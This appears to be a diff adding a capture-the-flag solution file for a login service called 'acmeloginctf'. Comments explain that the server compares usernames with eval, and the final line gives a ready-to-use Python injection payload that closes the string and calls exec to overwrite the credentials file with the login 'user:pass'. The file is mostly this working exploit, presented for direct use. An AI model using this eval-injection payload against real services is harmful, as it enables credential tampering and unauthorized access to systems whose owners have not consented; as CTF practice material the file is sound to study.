@@ -1,0 +1,8 @@
+# Since the server is vulnerable to python code injection due to using eval to compare the username with the client input we can close the
+# string with a single tick ' and concatenate an exec statement + exec() that will write to the password file with a given username of user
+# and a password of pass. We can then concatenate another single tick ' to keep any syntax errors from occurring. This causes a panic error
+# and the socket will close but since the password file is only changed at startup of the service the new creds we inserted still work
+
+#tldr you give this exact string below as the username or password and it changes the creds to user and pass
+
+' + exec("f = open(\"creds_acmeloginctf\", \"w\")\nf.write(\"user:pass\")\nf.close()") + '
